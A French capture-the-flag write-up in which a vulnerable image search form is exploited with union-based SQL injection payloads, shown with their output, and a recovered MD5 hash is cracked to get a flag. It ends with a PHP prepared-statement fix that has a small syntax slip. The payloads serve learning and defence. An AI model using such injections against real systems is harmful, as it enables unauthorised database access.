
# Explications

Dans la page "searchimg", il y un formulaire pour faire une recherche des membres par id du site :
```html
<form action="#" method="GET" data-children-count="1">
	<input type="hidden" name="page" value="searchimg">
	<input type="text" name="id">
	<br>
	<input type="submit" name="Submit" value="Submit">
</form>
```
On sait que le site utilise une base de donnée sous MySQL et qu'il ne gere pas les entrées non prevues grâce a la faille précedente.
On peut donc effectuer des injections SQL.
Celle qui a fonctionner était une **Union-Based SQL Injection**

## Etapes
On mets une condition vraie dans tous les cas

<code>1 OR 1=1</code>
> Tous les imgs s'affichent
<pre>
ID: 1 OR 1=1
Title: Nsa
Url : https://www.nsa.org/img.jpg

ID: 1 OR 1=1 
Title: 42 !
Url : https://www.42.fr/42.png

ID: 1 OR 1=1 
Title: Google
Url : https://www.google.fr/google.png

ID: 1 OR 1=1 
Title: Obama
Url : https://www.obama.org/obama.jpg

ID: 1 OR 1=1 
Title: Hack me ?
Url : borntosec.ddns.net/images.png

ID: 1 OR 1=1 
Title: tr00l
Url : https://www.h4x0r3.0rg/tr0ll.png
</pre>

On affiche essaye d'afficher tous les noms de colonnes et de tables présentes sur la base de données a la palce de **Title** et d' **Url**

<code>1 UNION SELECT column_name, table_name FROM information_schema.columns</code>
> Toutes les tables et leurs colonnes s'affichent a la place du **First name** et du **Surname**

On cherche et on trouve un table **list_images** qui contient les colonnes :
1. id
2. url
3. title
4. comment

On cherche donc des informations intéressantes.

On try 2 part 2 les champs jusqu'à trouver 1 colonne intéressant, **title** qui donne (avec **Url**):

<code>1 UNION select url, comment from list_images</code>

<pre>
ID: 1 UNION SELECT url, comment from list_images 
Title: Nsa
Url : https://www.nsa.org/img.jpg

ID: 1 UNION SELECT url, comment from list_images 
Title: An image about the NSA !
Url : https://www.nsa.org/img.jpg

ID: 1 UNION SELECT url, comment from list_images 
Title: There is a number..
Url : https://www.42.fr/42.png

ID: 1 UNION SELECT url, comment from list_images 
Title: Google it !
Url : https://www.google.fr/google.png

ID: 1 UNION SELECT url, comment from list_images 
Title: Yes we can !
Url : https://www.obama.org/obama.jpg

ID: 1 UNION SELECT url, comment from list_images 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : borntosec.ddns.net/images.png

ID: 1 UNION SELECT url, comment from list_images 
Title: Because why not ?
Url : https://www.h4x0r3.0rg/tr0ll.png
</pre>

Le password <code>1928e8083cf461a51303633093573c46</code> est en MD5 donc on applique un MD5 reverse et on obtient :
<pre>albatroz</pre>
On applique un Sha256, car c'est deja lower, pour obtenir le flag

# Comment l'éviter?
Il suffit d'utiliser le <code>prepare</code> quand on fait des requêtes à la base de données comme dans l'exmple ci-dessous:

```php
<?php
	function name(id) {
		try
		{
			// On se connecte
			$bdd = new PDO('mysql:host=localhost;dbname=name', 'mdp', '', array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION ));
			
			// On prépare la requête
			$requete = $bdd->prepare("SELECT * FROM users WHERE id = :id");

			// On lie la variable $id définie au-dessus au paramètre :id de la requête préparée
			$requete->bindValue(':id', $id, PDO::PARAM_STR);

			//On exécute la requête
			$requete->execute();
			
			// On récupère le résultat
			if ($requete->fetch())
			{
				echo 'INFORMATIONS';
			}
		} catch (Exception $e)
		{
			die('Erreur : ' . $e->getMessage());
		}
	}
?>
```